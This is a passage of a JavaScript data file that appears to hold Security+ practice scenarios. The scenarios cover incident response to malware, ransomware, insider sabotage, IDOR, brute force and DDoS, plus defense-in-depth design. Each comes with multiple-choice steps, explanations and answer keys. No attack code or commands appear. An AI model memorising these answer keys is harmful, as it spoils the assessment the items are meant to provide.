      { id: 's3', icon: 'download', label: 'PowerShell downloads a second-stage payload from a paste site', time: 'T+1m30s' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'Office spawning PowerShell right after macros are enabled, followed by a payload download, is a well-known malicious-document infection chain (initial access via phishing, then execution). This is high severity since a second-stage payload is already on the host. The first action is to isolate the workstation from the network before the payload can call out again or spread.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'isolatehost', text: 'Isolate the HR employee\'s workstation from the network' },
            { id: 'deletefile', text: 'Just delete the attachment from the mail server' },
            { id: 'ignorepwsh', text: 'Assume PowerShell activity is normal admin scripting' },
            { id: 'rebootonly', text: 'Reboot the workstation and move on' }
          ] }
        ] },
        answer: { slots: { sev: 'high', first: 'isolatehost' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by isolating the host, eradicate the dropper and any second-stage payload, recover by reimaging or verifying a clean state, then disable Office macros by default org-wide as lessons learned.',
        payload: { items: [
          { id: 'a', label: 'Isolate the workstation from the network' },
          { id: 'b', label: 'Identify and remove the dropper and second-stage payload' },
          { id: 'c', label: 'Reimage the workstation or verify it is clean before returning to service' },
          { id: 'd', label: 'Disable Office macros by default across the organization' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 15. Ransomware — double extortion, network reference
  {
    id: 'sp-ir-ransomware-doubleextortion', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'Double-extortion ransomware with data leak threat', estMinutes: 5, archetype: 'incident',
    scenario: 'Overnight, the accounting server was encrypted and a ransom note claims 200GB of financial data was also copied out before encryption, threatening to publish it if payment is not made within 72 hours. Firewall logs confirm a large outbound transfer to an unfamiliar IP just before the encryption began.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'acct', label: 'ACCT-SRV', type: 'server', zone: 'internal', x: 60, y: 90, state: 'compromised' },
      { id: 'fw', label: 'FW-CORE', type: 'firewall', zone: 'dmz', x: 240, y: 90, state: 'clean' },
      { id: 'ext', label: 'Attacker Exfil Host', type: 'external', zone: 'external', x: 420, y: 90, state: 'clean' }
    ], links: [
      { from: 'acct', to: 'fw', kind: 'attack' },
      { from: 'fw', to: 'ext', kind: 'attack' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'Encryption combined with confirmed pre-encryption exfiltration and an extortion threat is double-extortion ransomware — a critical incident involving both availability loss and a confirmed breach. The first action is to isolate the accounting server and block the outbound path to the attacker\'s exfil host to stop any further data loss.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'isolateblock', text: 'Isolate the accounting server and block the outbound exfil path' },
            { id: 'paynow', text: 'Pay the ransom before the 72-hour deadline' },
            { id: 'restorefirst', text: 'Restore from backup immediately without isolating first' },
            { id: 'publicstatement', text: 'Issue a public statement before containing the incident' }
          ] }
        ] },
        answer: { slots: { sev: 'crit', first: 'isolateblock' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by isolating the host and blocking exfil, eradicate the ransomware and access used for exfiltration, recover from clean backups once the environment is verified safe, then engage legal/breach-notification obligations given confirmed data theft as part of lessons learned.',
        payload: { items: [
          { id: 'a', label: 'Isolate the server and block the exfiltration path' },
          { id: 'b', label: 'Remove the ransomware and close the access used for exfiltration' },
          { id: 'c', label: 'Restore the server from a verified clean backup' },
          { id: 'd', label: 'Engage legal counsel for breach-notification obligations' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 16. Insider threat — sabotage variant, Recovery emphasis
  {
    id: 'sp-ir-insider-sabotage', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'Disgruntled admin deletes production backups', estMinutes: 5, archetype: 'incident',
    scenario: 'A system administrator who was passed over for promotion used their still-active credentials after hours to delete the last 30 days of production database backups. The deletion was discovered the next morning when a routine restore test failed.',
    assets: { reference: { kind: 'timeline', stages: [
      { id: 's1', icon: 'clock', label: 'Admin logs in after hours using still-active credentials', time: 'T-14h' },
      { id: 's2', icon: 'trash', label: '30 days of production database backups deleted', time: 'T-13h45m' },
      { id: 's3', icon: 'alert', label: 'Routine restore test fails the next morning, revealing the deletion', time: 'T+0m' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'Deliberate, after-hours deletion of a month of backups by a disgruntled insider is a critical sabotage incident — it directly threatens recovery capability if production data is ever lost. The first action is to revoke that administrator\'s credentials and access immediately to prevent further destructive actions.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'revoke', text: 'Revoke the administrator\'s credentials and access immediately' },
            { id: 'talkfirst', text: 'Schedule a one-on-one conversation before taking any action' },
            { id: 'restoreonly', text: 'Try to restore backups without addressing account access' },
            { id: 'ignorepast', text: 'Take no action since the backups are already gone' }
          ] }
        ] },
        answer: { slots: { sev: 'crit', first: 'revoke' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by revoking access, eradicate by auditing for any other destructive actions or lingering access the admin retained, recover by pulling backups from an offsite/immutable copy if one exists and validating integrity, then require offboarding/access-review changes and separation-of-duties for backup deletion as lessons learned.',
        payload: { items: [
          { id: 'a', label: 'Revoke the administrator\'s credentials and access' },
          { id: 'b', label: 'Audit for other destructive actions or retained access' },
          { id: 'c', label: 'Recover backups from an offsite/immutable copy and validate integrity' },
          { id: 'd', label: 'Require approval workflows and offsite immutability for backup deletion' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 17. Malware — worm lateral spread, Containment emphasis, network reference
  {
    id: 'sp-ir-worm-lateral-spread', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'Self-propagating worm spreading via SMB', estMinutes: 5, archetype: 'incident',
    scenario: 'Within 20 minutes, three additional workstations became infected after the first one, each exploiting an unpatched SMB vulnerability to spread automatically with no user interaction. The infection rate is accelerating.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'w1', label: 'WKS-01', type: 'workstation', zone: 'internal', x: 40, y: 60, state: 'compromised' },
      { id: 'w2', label: 'WKS-02', type: 'workstation', zone: 'internal', x: 180, y: 60, state: 'compromised' },
      { id: 'w3', label: 'WKS-03', type: 'workstation', zone: 'internal', x: 320, y: 60, state: 'affected' },
      { id: 'w4', label: 'WKS-04', type: 'workstation', zone: 'internal', x: 460, y: 60, state: 'clean' }
    ], links: [
      { from: 'w1', to: 'w2', kind: 'attack' },
      { from: 'w2', to: 'w3', kind: 'attack' },
      { from: 'w3', to: 'w4', kind: 'normal' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'A self-propagating worm exploiting an unpatched SMB vulnerability with no user interaction and an accelerating infection rate is a critical incident that can compromise the entire network quickly. The first action is to segment/disable SMB (or the affected VLAN) network-wide to halt the automatic spread before individual hosts are cleaned.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'blocksmb', text: 'Block or disable SMB network-wide to halt automatic spread' },
            { id: 'cleanone', text: 'Clean only the first infected workstation and monitor' },
            { id: 'patchfirst', text: 'Patch the SMB vulnerability on all hosts before containing anything' },
            { id: 'waitandsee', text: 'Wait to see how many more hosts get infected before acting' }
          ] }
        ] },
        answer: { slots: { sev: 'crit', first: 'blocksmb' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by blocking the spreading vector network-wide, eradicate the worm from every infected host, recover by patching the vulnerability before re-enabling SMB, then apply network segmentation as the lessons-learned control to limit future lateral movement.',
        payload: { items: [
          { id: 'a', label: 'Block SMB network-wide to halt the spread' },
          { id: 'b', label: 'Remove the worm from all infected hosts' },
          { id: 'c', label: 'Patch the SMB vulnerability before re-enabling SMB traffic' },
          { id: 'd', label: 'Segment the network to limit future lateral movement' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 18. Web app attack — API abuse / broken access control, Detection emphasis
  {
    id: 'sp-ir-api-idor', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'Broken access control exposes other customers\' orders', estMinutes: 4, archetype: 'incident',
    scenario: 'A customer reports that changing an order ID number in the mobile app\'s API URL let them view a stranger\'s order details, including a shipping address and partial card number. Logs show the same technique being used by dozens of sequential requests from one IP over the past hour.',
    assets: { reference: { kind: 'timeline', stages: [
      { id: 's1', icon: 'bug', label: 'Customer reports viewing another customer\'s order by changing the ID in the URL', time: 'T+0m' },
      { id: 's2', icon: 'list', label: 'Logs show dozens of sequential order-ID requests from one IP over the past hour', time: 'T-1h' },
      { id: 's3', icon: 'data', label: 'Exposed data includes shipping addresses and partial card numbers', time: 'T-1h' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'An insecure direct object reference (IDOR) letting one user enumerate and view other customers\' orders — already actively exploited for at least an hour, exposing PII and partial payment data — is a critical incident. The first action is to disable or patch the vulnerable API endpoint immediately to stop further data exposure.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'disableapi', text: 'Disable or patch the vulnerable API endpoint immediately' },
            { id: 'thankcustomer', text: 'Thank the reporting customer and take no further action' },
            { id: 'blockip', text: 'Block only the one reporting customer\'s IP address' },
            { id: 'ignoreapi', text: 'Schedule the fix for the next sprint' }
          ] }
        ] },
        answer: { slots: { sev: 'crit', first: 'disableapi' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by shutting off the exposed endpoint, eradicate by adding proper authorization checks to every order-lookup call, recover by determining the scope of exposed records and notifying affected customers, then add automated access-control testing as lessons learned.',
        payload: { items: [
          { id: 'a', label: 'Disable or patch the vulnerable API endpoint' },
          { id: 'b', label: 'Add proper authorization checks to all order-lookup calls' },
          { id: 'c', label: 'Determine the scope of exposed records and notify affected customers' },
          { id: 'd', label: 'Add automated access-control testing to the release pipeline' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 19. Credential/password attack — brute force against VPN — Forensics & Investigations (log-source selection, artifact correlation)
  {
    id: 'sp-ir-bruteforce-vpn', cert: 'secplus', objective: '4.9', topic: 'Forensics & Investigations',
    title: 'Brute-force attack against the VPN gateway — investigating scope', estMinutes: 4, archetype: 'incident',
    scenario: 'The VPN concentrator logs show over 5,000 failed login attempts against a single username from one external IP over 30 minutes, followed by one successful authentication using that same username. The investigator now needs to determine what the attacker actually did once inside, and to build a timeline other analysts can reproduce.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'atk', label: 'Attacker', type: 'external', zone: 'external', x: 40, y: 90, state: 'clean' },
      { id: 'vpn', label: 'VPN-GW', type: 'router', zone: 'dmz', x: 240, y: 90, state: 'affected' },
      { id: 'internal', label: 'Internal Network', type: 'network', zone: 'internal', x: 440, y: 90, state: 'clean' }
    ], links: [
      { from: 'atk', to: 'vpn', kind: 'attack' },
      { from: 'vpn', to: 'internal', kind: 'attack' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Select the investigation approach.',
        explanation: 'To see what the attacker did after authenticating — which internal hosts they touched and what actions they took — the investigator needs internal firewall/NetFlow records and endpoint/authentication logs from the systems the session reached, not just the VPN concentrator\'s own login log (which only proves the successful auth, not post-auth activity). Because clocks drift between devices, correlating the VPN log against those other sources first requires normalizing all timestamps to a common reference (e.g., UTC/NTP-synced) so events can be placed on one accurate timeline.',
        payload: { slots: [
          { id: 'source', label: 'Best additional data source for post-authentication activity', options: [
            { id: 'internallogs', text: 'Internal firewall/NetFlow and endpoint logs for hosts reached via the VPN session' },
            { id: 'dnszone', text: 'The public DNS zone file for the company domain' },
            { id: 'vendoradvisory', text: 'The VPN vendor\'s public security advisory page' },
            { id: 'helpdesk', text: 'General help-desk ticket volume for the day' }
          ] },
          { id: 'first', label: 'Prerequisite before correlating events across sources', options: [
            { id: 'normalize', text: 'Normalize all log timestamps to a common time reference (e.g., UTC/NTP)' },
            { id: 'deletevpn', text: 'Delete the VPN log once the internal logs are pulled' },
            { id: 'guesstime', text: 'Estimate timing by eye without reconciling clocks' },
            { id: 'skipauth', text: 'Skip the VPN log since the internal logs are more detailed' }
          ] }
        ] },
        answer: { slots: { source: 'internallogs', first: 'normalize' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the investigation steps to build a reproducible timeline.',
        explanation: 'Sound artifact correlation: pull the VPN log establishing the successful-auth timestamp, gather internal firewall/NetFlow and endpoint logs covering that session window, normalize all timestamps to a common reference so events line up correctly, then correlate the sources into a single reproducible timeline of attacker activity.',
        payload: { items: [
          { id: 'a', label: 'Pull the VPN concentrator log establishing the successful-authentication timestamp' },
          { id: 'b', label: 'Gather internal firewall/NetFlow and endpoint logs covering that session window' },
          { id: 'c', label: 'Normalize timestamps across all sources to a common time reference' },
          { id: 'd', label: 'Correlate the sources into a single reproducible timeline of attacker activity' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 20. DDoS — application-layer variant, Lessons learned emphasis
  {
    id: 'sp-ir-ddos-applayer-api', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'Application-layer DDoS against the search API', estMinutes: 4, archetype: 'incident',
    scenario: 'The product search API begins timing out under a flood of expensive, complex search queries sent from a botnet of a few hundred hosts — low in volume compared to a typical flood, but each request consumes significant database CPU. The database server is pegged at 100% CPU.',
    assets: { reference: { kind: 'timeline', stages: [
      { id: 's1', icon: 'search', label: 'Search API receives a flood of expensive, complex queries from ~300 hosts', time: 'T+0m' },
      { id: 's2', icon: 'cpu', label: 'Database server CPU pegged at 100%', time: 'T+4m' },
      { id: 's3', icon: 'down', label: 'Search functionality becomes unusable site-wide', time: 'T+6m' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'A relatively low request volume causing full resource exhaustion is application-layer (Layer 7) DDoS — attackers targeting the most expensive operation rather than raw bandwidth. Because search is unusable site-wide, this is critical. The first action is to rate-limit or throttle the expensive search endpoint to relieve database load.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'throttle', text: 'Rate-limit or throttle the expensive search endpoint' },
            { id: 'scaledb', text: 'Permanently upgrade database hardware as the only fix' },
            { id: 'blockall', text: 'Block all inbound traffic to the entire site' },
            { id: 'ignoreload', text: 'Ignore it since the flood volume is relatively low' }
          ] }
        ] },
        answer: { slots: { sev: 'crit', first: 'throttle' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by throttling the abused endpoint, eradicate by blocking the identified botnet source ranges, recover by confirming search returns to normal performance, then add query complexity limits and WAF rules as the lessons-learned control against future application-layer floods.',
        payload: { items: [
          { id: 'a', label: 'Rate-limit or throttle the expensive search endpoint' },
          { id: 'b', label: 'Block the identified botnet source IP ranges' },
          { id: 'c', label: 'Confirm search performance has returned to normal' },
          { id: 'd', label: 'Add query complexity limits and WAF rules for future protection' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // ── Defense in Depth (Task 14, 2-agent gated) ──
  { id: 'secplus-did-hollow-perimeter', cert: 'secplus',
    objective: 'SY0-701 Domain 3.2 — Compare and contrast security implications of architecture models (defense in depth, control categories)',
    topic: 'Defense in Depth', title: 'Strong wall, hollow inside', estMinutes: 6, archetype: 'defense',
    scenario: 'A security review of Northwind HQ finds a capable next-gen firewall at the edge and almost nothing behind it. Endpoints are unmanaged, the database stores records in clear text, and one shared admin account opens everything. A single phishing click puts an attacker next to the crown jewels.',
    assets: { reference: { kind: 'layered', layout: 'stacked',
      layers: [
        { id: 'perimeter', label: 'Perimeter', control: 'Next-gen firewall', state: 'present', device: { label: 'FW-1' } },
        { id: 'endpoint', label: 'Endpoint', control: 'EDR and host hardening', state: 'missing' },
        { id: 'data', label: 'Data', control: 'Encryption at rest and DLP', state: 'missing' },
        { id: 'identity', label: 'Identity', control: 'MFA and least privilege', state: 'missing' }
      ],
      core: { label: 'Crown-jewel data', assets: [
        { id: 'db1', label: 'DB-1 (customer records, clear text)', exposed: true },
        { id: 'dc1', label: 'DC-1 (identity store)', exposed: true }
      ] }
    } },
    steps: [
      { id: 'd1', type: 'configure', points: 1,
        prompt: 'What is the core flaw in this architecture?',
        explanation: 'Everything rides on one control. Once the perimeter is bypassed, by phishing or an insider, nothing else slows the attacker before the data because there are no endpoint, data, or identity controls behind the firewall.',
        payload: { slots: [ { id: 'flaw', label: 'Core flaw', options: [
          { id: 'f1', text: 'It is a hard shell with a soft center: one perimeter, no inner controls' },
          { id: 'f2', text: 'The firewall vendor is not on the approved list' },
          { id: 'f3', text: 'The network uses too many subnets' },
          { id: 'f4', text: 'The database server is running on outdated hardware' }
        ] } ] },
        answer: { slots: { flaw: 'f1' } } },
      { id: 'f1', type: 'configure', points: 1,
        prompt: 'Build the inner layers.',
        explanation: 'EDR and hardening give each host its own line of defense, encryption and DLP protect the data itself, and MFA with least privilege shrinks what a stolen credential can do.',
        payload: { slots: [
          { id: 'endpoint', label: 'Endpoint layer', options: [
            { id: 'a1', text: 'EDR plus host hardening' }, { id: 'a2', text: 'A louder antivirus pop-up' }, { id: 'a3', text: 'Local admin rights for every user' } ] },
          { id: 'data', label: 'Data layer', options: [
            { id: 'b1', text: 'Encryption at rest plus DLP' }, { id: 'b2', text: 'A nightly backup, nothing else' }, { id: 'b3', text: 'Public read access for convenience' } ] },
          { id: 'identity', label: 'Identity layer', options: [
            { id: 'c1', text: 'MFA plus least privilege' }, { id: 'c2', text: 'One shared admin account' }, { id: 'c3', text: 'Longer passwords, no other change' } ] }
        ] },
        answer: { slots: { endpoint: 'a1', data: 'b1', identity: 'c1' } } },
      { id: 't1', type: 'configure', points: 1,
        prompt: 'MFA is best classified as which control type?',
        explanation: 'MFA is enforced by technology (technical) and stops misuse before it happens (preventive), not after an event has already occurred.',
        payload: { slots: [ { id: 'type', label: 'Control type', options: [
          { id: 't1', text: 'Technical, preventive' },
          { id: 't2', text: 'Physical, detective' },
          { id: 't3', text: 'Managerial, corrective' },
          { id: 't4', text: 'Operational, compensating' }
        ] } ] },
        answer: { slots: { type: 't1' } } }
    ]
  },

  { id: 'secplus-did-clinic-breach', cert: 'secplus',
    objective: 'SY0-701 Domain 3.2 — Compare and contrast security implications of architecture models (zero trust, control categories)',
    topic: 'Defense in Depth', title: 'A clinic that trusts anything already inside', estMinutes: 6, archetype: 'defense',
    scenario: 'A regional clinic passed its firewall audit with flying colors, but once inside the network every workstation can reach the patient records database directly, there is no logging on that database, and staff share one login for the scheduling system. An attacker who lands on any workstation has an unmonitored path to patient data.',
    assets: { reference: { kind: 'layered', layout: 'stacked',
      layers: [
        { id: 'perimeter', label: 'Perimeter', control: 'Audited edge firewall', state: 'present', device: { label: 'FW-1' } },
        { id: 'network', label: 'Network segmentation', control: 'Micro-segmentation isolating the records database', state: 'missing' },
        { id: 'monitoring', label: 'Monitoring', control: 'Database access logging and alerting', state: 'missing' },
        { id: 'identity', label: 'Identity', control: 'Unique accounts and least privilege', state: 'missing' }
      ],
      core: { label: 'Patient records', assets: [
        { id: 'phi1', label: 'PHI-DB (patient records)', exposed: true }
      ] }
    } },
    steps: [
      { id: 'd1', type: 'configure', points: 1,
        prompt: 'What is the core flaw in this architecture?',
        explanation: 'The design assumes anything past the firewall is safe. Every workstation has an unrestricted, unlogged path to the database, and shared logins mean no one can be held accountable for access. This is the opposite of zero trust.',
        payload: { slots: [ { id: 'flaw', label: 'Core flaw', options: [
          { id: 'f1', text: 'Implicit trust inside the network: no segmentation, no logging, no accountability' },
          { id: 'f2', text: 'The firewall audit was performed by an unqualified vendor' },
          { id: 'f3', text: 'The clinic uses too many workstations' },
          { id: 'f4', text: 'The database server needs a hardware upgrade' }
        ] } ] },
        answer: { slots: { flaw: 'f1' } } },
      { id: 'f1', type: 'configure', points: 1,
        prompt: 'Build the inner layers.',
        explanation: 'Micro-segmentation limits which hosts can reach the database at all, logging and alerting give visibility into who touches patient data, and unique accounts with least privilege restore accountability.',
        payload: { slots: [
          { id: 'network', label: 'Network layer', options: [
            { id: 'a1', text: 'Micro-segmentation restricting database access to approved application servers' }, { id: 'a2', text: 'Allow every workstation to reach the database directly' }, { id: 'a3', text: 'Remove the firewall since it already passed audit' } ] },
          { id: 'monitoring', label: 'Monitoring layer', options: [
            { id: 'b1', text: 'Database access logging with alerting on anomalous queries' }, { id: 'b2', text: 'No logging, to save disk space' }, { id: 'b3', text: 'A monthly manual spreadsheet review' } ] },
          { id: 'identity', label: 'Identity layer', options: [
            { id: 'c1', text: 'Unique accounts per staff member with least privilege' }, { id: 'c2', text: 'One shared scheduling login for the whole clinic' }, { id: 'c3', text: 'Passwords that never expire' } ] }
        ] },
        answer: { slots: { network: 'a1', monitoring: 'b1', identity: 'c1' } } },
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Database access logging and alerting is best classified as which control type?',
        explanation: 'Logging and alerting are enforced through technology (technical) and identify malicious activity after it has started rather than preventing it outright, which makes it detective.',
        payload: { slots: [ { id: 'type', label: 'Control type', options: [
          { id: 't1', text: 'Technical, detective' },
          { id: 't2', text: 'Managerial, preventive' },
          { id: 't3', text: 'Physical, deterrent' },
          { id: 't4', text: 'Operational, corrective' }
        ] } ] },
        answer: { slots: { type: 't1' } } }
    ]
  },

  { id: 'secplus-did-cloud-bucket', cert: 'secplus',
    objective: 'SY0-701 Domain 3.2 — Compare and contrast security implications of architecture models (cloud security, control categories)',
    topic: 'Defense in Depth', title: 'A cloud app with one line of defense', estMinutes: 6, archetype: 'defense',
    scenario: 'A startup moved its customer app to the cloud and configured a web application firewall in front of it. Behind the WAF, the storage bucket holding customer uploads is publicly readable, the application server runs with an overly permissive IAM role, and there is no vulnerability scanning of the container images before they deploy.',
    assets: { reference: { kind: 'layered', layout: 'stacked',
      layers: [
        { id: 'perimeter', label: 'Perimeter', control: 'Web application firewall', state: 'present', device: { label: 'WAF-1' } },
        { id: 'data', label: 'Data', control: 'Private bucket policy with least-privilege access', state: 'missing' },
        { id: 'identity', label: 'Identity', control: 'Scoped IAM role for the application server', state: 'missing' },
        { id: 'application', label: 'Application', control: 'Vulnerability scanning in the CI/CD pipeline', state: 'missing' }
      ],
      core: { label: 'Customer data', assets: [
        { id: 'bkt1', label: 'BKT-1 (public storage bucket)', exposed: true }
      ] }
    } },
    steps: [
      { id: 'd1', type: 'configure', points: 1,
        prompt: 'What is the core flaw in this architecture?',
        explanation: 'The WAF only inspects web traffic to the app; it does nothing to protect a publicly readable storage bucket, an overprivileged IAM role, or unscanned container images. One control at the edge cannot cover every layer of a cloud stack.',
        payload: { slots: [ { id: 'flaw', label: 'Core flaw', options: [
          { id: 'f1', text: 'A single WAF is treated as sufficient while storage, identity, and the build pipeline are left uncontrolled' },
          { id: 'f2', text: 'The WAF vendor is not FedRAMP certified' },
          { id: 'f3', text: 'The application server is undersized for the traffic' },
          { id: 'f4', text: 'The cloud region is too far from customers' }
        ] } ] },
        answer: { slots: { flaw: 'f1' } } },
      { id: 'f1', type: 'configure', points: 1,
        prompt: 'Build the inner layers.',
        explanation: 'A private bucket policy stops public read access to customer uploads, a scoped IAM role limits what the app server can do if compromised, and pipeline scanning catches vulnerable images before they ever deploy.',
        payload: { slots: [
          { id: 'data', label: 'Data layer', options: [
            { id: 'a1', text: 'Private bucket policy granting access only to the application role' }, { id: 'a2', text: 'Public read access so the app can serve files directly' }, { id: 'a3', text: 'No bucket policy, rely on the WAF' } ] },
          { id: 'identity', label: 'Identity layer', options: [
            { id: 'b1', text: 'IAM role scoped to only the permissions the app needs' }, { id: 'b2', text: 'Administrator role for the application server, to avoid access errors' }, { id: 'b3', text: 'Shared root credentials for all services' } ] },
          { id: 'application', label: 'Application layer', options: [
            { id: 'c1', text: 'Vulnerability scanning of container images in CI/CD' }, { id: 'c2', text: 'Skip scanning to speed up deployments' }, { id: 'c3', text: 'Scan images once per year' } ] }
        ] },
        answer: { slots: { data: 'a1', identity: 'b1', application: 'c1' } } },
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Scoping the IAM role to least privilege is best classified as which control type?',
        explanation: 'Least-privilege IAM scoping is enforced by the cloud platform itself (technical) and limits what an attacker can do before any damage occurs, making it preventive.',
        payload: { slots: [ { id: 'type', label: 'Control type', options: [
          { id: 't1', text: 'Technical, preventive' },
          { id: 't2', text: 'Managerial, detective' },
          { id: 't3', text: 'Physical, preventive' },
          { id: 't4', text: 'Operational, corrective' }
        ] } ] },
        answer: { slots: { type: 't1' } } }
    ]
  },

  { id: 'secplus-did-vendor-remote-access', cert: 'secplus',
    objective: 'SY0-701 Domain 3.2 — Compare and contrast security implications of architecture models (third-party access, control categories)',
    topic: 'Defense in Depth', title: 'A vendor with the keys to everything', estMinutes: 6, archetype: 'defense',
    scenario: 'A manufacturing plant lets a third-party HVAC vendor remote into its network to service building controls. The vendor connects through a properly configured VPN, but from there the vendor account can reach the plant\'s production control systems, sessions are never recorded, and the vendor account has never been reviewed since it was created two years ago.',
    assets: { reference: { kind: 'layered', layout: 'stacked',
      layers: [
        { id: 'perimeter', label: 'Perimeter', control: 'VPN gateway for vendor remote access', state: 'present', device: { label: 'VPN-1' } },
        { id: 'network', label: 'Network segmentation', control: 'Jump host isolating vendor access from production systems', state: 'missing' },
        { id: 'monitoring', label: 'Monitoring', control: 'Session recording for third-party access', state: 'missing' },
        { id: 'identity', label: 'Identity', control: 'Periodic access review of vendor accounts', state: 'missing' }
      ],
      core: { label: 'Production control systems', assets: [
        { id: 'ics1', label: 'ICS-1 (production controller)', exposed: true }
      ] }
    } },
    steps: [
      { id: 'd1', type: 'configure', points: 1,
        prompt: 'What is the core flaw in this architecture?',
        explanation: 'The VPN itself is fine, but past it the vendor has an unrestricted, unrecorded, never-reviewed path straight to production controllers. A compromised vendor credential or a disgruntled contractor would go unnoticed indefinitely.',
        payload: { slots: [ { id: 'flaw', label: 'Core flaw', options: [
          { id: 'f1', text: 'Third-party access is unrestricted, unmonitored, and never reviewed once inside the VPN' },
          { id: 'f2', text: 'The VPN uses outdated encryption' },
          { id: 'f3', text: 'The HVAC vendor is not licensed in the state' },
          { id: 'f4', text: 'The production controllers need a firmware update' }
        ] } ] },
        answer: { slots: { flaw: 'f1' } } },
      { id: 'f1', type: 'configure', points: 1,
        prompt: 'Build the inner layers.',
        explanation: 'A jump host limits the vendor to only the systems they need, session recording gives an audit trail of everything the vendor does, and periodic access review catches accounts that should have been revoked long ago.',
        payload: { slots: [
          { id: 'network', label: 'Network layer', options: [
            { id: 'a1', text: 'Jump host restricting vendor access to HVAC systems only' }, { id: 'a2', text: 'Direct vendor access to the full production network' }, { id: 'a3', text: 'No restriction, since the VPN is already trusted' } ] },
          { id: 'monitoring', label: 'Monitoring layer', options: [
            { id: 'b1', text: 'Session recording for all third-party remote access' }, { id: 'b2', text: 'No session logging, to respect vendor privacy' }, { id: 'b3', text: 'A yearly vendor satisfaction survey' } ] },
          { id: 'identity', label: 'Identity layer', options: [
            { id: 'c1', text: 'Quarterly access review of vendor accounts' }, { id: 'c2', text: 'Vendor accounts that never expire or get reviewed' }, { id: 'c3', text: 'One shared vendor account for all contractors' } ] }
        ] },
        answer: { slots: { network: 'a1', monitoring: 'b1', identity: 'c1' } } },
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Periodic access review of vendor accounts is best classified as which control type?',
        explanation: 'Access reviews are a managerial policy activity, typically carried out on a schedule as part of governance, and they identify problems (like stale accounts) after the fact, which makes them detective.',
        payload: { slots: [ { id: 'type', label: 'Control type', options: [
          { id: 't1', text: 'Managerial, detective' },
          { id: 't2', text: 'Technical, preventive' },
          { id: 't3', text: 'Physical, deterrent' },
          { id: 't4', text: 'Operational, compensating' }
        ] } ] },
        answer: { slots: { type: 't1' } } }
    ]
  },

  { id: 'secplus-did-branch-office-ransomware', cert: 'secplus',
    objective: 'SY0-701 Domain 3.2 — Compare and contrast security implications of architecture models (defense in depth, control categories)',
    topic: 'Defense in Depth', title: 'One phishing email away from total loss', estMinutes: 6, archetype: 'defense',
    scenario: 'A law firm\'s branch office relies on email spam filtering as its only defense against ransomware. Endpoints have no EDR, backups are stored on a network share reachable from every workstation, and there is no security awareness training, so staff routinely click on suspicious attachments.',
    assets: { reference: { kind: 'layered', layout: 'stacked',
      layers: [
